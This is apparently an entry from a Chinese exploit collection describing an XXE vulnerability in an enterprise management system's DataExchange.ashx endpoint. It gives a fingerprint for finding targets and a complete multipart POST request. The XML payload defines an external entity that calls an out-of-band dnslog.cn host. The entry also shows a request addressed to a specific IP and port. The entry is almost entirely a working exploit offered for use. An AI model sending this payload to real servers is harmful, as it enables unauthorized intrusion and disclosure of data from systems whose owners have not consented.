# 某联达企业管理系统-Data.ashx文件存在-XXE

- **系统**：某联达企业管理系统-Data.ashx文件　|　**类型**：XXE　|　**CVE**：—
- **指纹**：`header="Services/Identification/login.ashx"`
- **请求**：`POST /GB/LK/Document/DataExchange/DataExchange.ashx HTTP/1.1`
- **关键头**：`Host: xxx`　`Sec-Purpose: prefetch;prerender`　`Purpose: prefetch`　`Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryJGgV5l5ta…`　`Content-Length: 405`

**请求体 / payload**
```
------WebKitFormBoundaryJGgV5l5ta05yAIe0
Content-Disposition: form-data;name="SystemName"
BIM
------WebKitFormBoundaryJGgV5l5ta05yAIe0
Content-Disposition: form-data;name="Params"
Content-Type: text/plain
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY t SYSTEM "http://`whoami`.ew1sda.dnslog.cn/">
]
>
<test>&t;</test>
------WebKitFormBoundaryJGgV5l5ta05yAIe0--
POST /GB/LK/Document/DataExchange/DataExchange.ashx HTTP/1.1
Host: 101.201.36.245:8888
Cookie: GTP_IdServer_LangID=2052
Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryJGgV5l5ta05yAIe0
Content-Length: 39…（脚本共 973 字，完整版见原文）
```